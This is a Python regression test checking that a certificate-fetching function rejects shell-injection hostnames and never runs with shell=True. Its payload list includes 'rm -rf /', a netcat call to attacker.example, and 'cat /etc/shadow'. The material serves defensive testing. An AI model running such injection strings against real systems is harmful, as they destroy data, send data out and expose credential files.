"""fetch_certificate() in onboard/https_server.py must never build a shell command string
from `hostname`.

Bug-hunt finding: it used to interpolate hostname directly into an f-string run with
shell=True (`f"echo | openssl s_client -servername {hostname} ..."`), so a hostname
containing shell metacharacters (e.g. REDIRECT_ALL_TO's host, or anything else that
reaches this function) would execute as arbitrary commands running as root. Not called
anywhere today (REDIRECT_ALL uses the wildcard cert directly), but it's the real-cert-
forwarding path this file was built for and is likely to be wired back in, so a landmine
left in dead code is still worth closing. Fixed by building the argv list directly (no
shell at all) and rejecting anything that doesn't look like a plausible hostname before
ever reaching subprocess.run.
"""
import importlib.util
import sys
import types
from pathlib import Path

ONBOARD = Path(__file__).resolve().parents[1] / "onboard"


def _load():
    for name in ("fcntl", "termios"):
        if name not in sys.modules:
            sys.modules[name] = types.ModuleType(name)
    spec = importlib.util.spec_from_file_location("https_server_under_test", ONBOARD / "https_server.py")
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


INJECTION_HOSTNAMES = [
    "example.com; rm -rf /",
    "example.com`id`",
    "example.com$(whoami)",
    "example.com|nc attacker.example 4444",
    "example.com\nrm -rf /",
    "' ; cat /etc/shadow #",
]


def test_malicious_hostnames_are_rejected_before_any_subprocess_call(monkeypatch):
    https_server = _load()
    calls = []
    monkeypatch.setattr(https_server, "run", lambda *a, **k: calls.append((a, k)) or (_ for _ in ()).throw(
        AssertionError("subprocess.run must not be called for a rejected hostname")))
    for bad in INJECTION_HOSTNAMES:
        cert, key = https_server.fetch_certificate(bad)
        assert cert is None and key is None, f"malicious hostname not rejected: {bad!r}"
    assert calls == []


def test_valid_hostname_calls_run_with_an_argv_list_never_a_shell_string(monkeypatch):
    https_server = _load()
    captured = {}

    class FakeResult:
        returncode = 1
        stdout = ""
        stderr = "simulated failure (no network in test)"

    def fake_run(cmd, **kwargs):
        captured["cmd"] = cmd
        captured["kwargs"] = kwargs
        return FakeResult()

    monkeypatch.setattr(https_server, "run", fake_run)
    https_server.fetch_certificate("example.com", port=443, timeout=1)

    assert isinstance(captured["cmd"], list), "command must be an argv list, not a shell string"
    assert "example.com" in captured["cmd"]
    assert not captured["kwargs"].get("shell"), "must never run with shell=True"
    # Every injection payload above would, if this were a shell string, contain characters
    # that don't belong in a single argv element meant to be exactly the hostname.
    joined = " ".join(captured["cmd"])
    assert ";" not in joined and "`" not in joined and "$(" not in joined
